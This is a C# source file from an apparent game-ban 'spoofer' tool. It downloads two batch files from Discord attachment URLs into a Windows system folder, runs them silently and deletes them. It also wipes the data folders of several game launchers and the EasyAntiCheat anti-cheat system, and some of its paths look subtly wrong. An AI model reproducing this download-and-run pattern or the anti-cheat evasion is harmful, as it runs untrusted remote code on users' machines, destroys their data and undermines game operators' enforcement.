using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace AedernSpoofer.Classes.Spoofing
{
    class Traces
    {
        private static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private static readonly string Documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

        public Traces()
        {
            DownloadRequirments();
            BattleNet();
            Riot();
            EasyAntiCheat();
            #region Start Registry.bat
            Process registry = new Process();
            registry.StartInfo.CreateNoWindow = true;
            registry.StartInfo.RedirectStandardInput = true;
            registry.StartInfo.UseShellExecute = false;
            registry.StartInfo.FileName = "C:\\Windows\\SysWOW64\\wbem\\Registry.bat";
            registry.Start();
            registry.WaitForExit();
            File.Delete("C:\\Windows\\SysWOW64\\wbem\\Registry.bat");

            Process vanregistry = new Process();
            vanregistry.StartInfo.CreateNoWindow = true;
            vanregistry.StartInfo.RedirectStandardInput = true;
            vanregistry.StartInfo.UseShellExecute = false;
            vanregistry.StartInfo.FileName = "C:\\Windows\\SysWOW64\\wbem\\Vangregistry.bat";
            vanregistry.Start();
            vanregistry.WaitForExit();
            File.Delete("C:\\Windows\\SysWOW64\\wbem\\Vangregistry.bat");
            #endregion
        }

        private void DownloadRequirments()
        {
            WebClient webClient = new WebClient();
            webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
            webClient.Proxy = null;
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/854451324413411331/854451384267440138/registry.bat", "C:\\Windows\\SysWOW64\\wbem\\Registry.bat");
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/854451324413411331/854456512390234142/vanguard_tracking_files", "C:\\Windows\\SysWOW64\\wbem\\Vangregistry.bat");
        }

        private void EasyAntiCheat()
        {
            Utils.DeleteDirectory(AppData + "\\Roaming\\EasyAntiCheat");
            Utils.DeleteDirectory(AppData + "\\Roaming\\Origin");
            Utils.DeleteDirectory("C:\\ProgramData\\Origin");
        }

        private void Riot()
        {
            Utils.DeleteDirectory(AppData + "\\Local\\Riot Games");
            Utils.DeleteDirectory("C:\\ProgramData\\Riot Games");
            //Utils.DeleteDirectory("C:\\Riot Games");
        }

        private void BattleNet()
        {
            Utils.DeleteDirectory(AppData + "\\Roaming\\Battle.net");
            Utils.DeleteDirectory(AppData + "\\Local\\Battle.net");
            Utils.DeleteDirectory(AppData + "\\Local\\Blizzard Entertainment");
            Utils.DeleteDirectory("C:\\ProgramData\\Battle.net");
            Utils.DeleteDirectory("C:\\ProgramData\\Blizzard Entertainment");
            Utils.DeleteDirectory(Documents + "\\Call of Duty Modern Warfare");
            Utils.DeleteDirectory(Documents + "\\Call of Duty Black Ops Cold War");
        }
    }
}
